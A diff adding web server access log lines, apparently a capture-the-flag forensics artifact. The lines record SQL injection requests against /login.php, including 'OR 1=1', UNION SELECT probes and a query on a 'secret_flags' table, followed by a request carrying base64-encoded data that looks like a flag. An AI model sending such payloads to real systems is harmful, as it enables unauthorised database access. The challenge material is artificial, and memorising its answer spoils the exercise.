@@ -1,0 +1,7 @@
+192.168.1.5 - - [10/Oct/2026:13:55:36 -0700] "GET /login.php HTTP/1.1" 200 2326
+192.168.1.5 - - [10/Oct/2026:13:55:40 -0700] "POST /login.php HTTP/1.1" 302 -
+192.168.1.5 - - [10/Oct/2026:13:55:42 -0700] "GET /login.php?user=admin' OR 1=1-- HTTP/1.1" 200 5000
+192.168.1.5 - - [10/Oct/2026:13:55:45 -0700] "GET /login.php?user=admin' UNION SELECT 1,2,3-- HTTP/1.1" 200 5000
+192.168.1.5 - - [10/Oct/2026:13:55:48 -0700] "GET /login.php?user=admin' UNION SELECT database(),2,3-- HTTP/1.1" 200 5020
+192.168.1.5 - - [10/Oct/2026:13:56:01 -0700] "GET /login.php?user=admin' UNION SELECT flag,2,3 FROM secret_flags-- HTTP/1.1" 200 5055
+192.168.1.5 - - [10/Oct/2026:13:56:10 -0700] "GET /image.png?data=RkxBR3tuM3R3MHJrX3RyNGZmMWNfbjN2M3JfbDEzc30= HTTP/1.1" 404 195\n
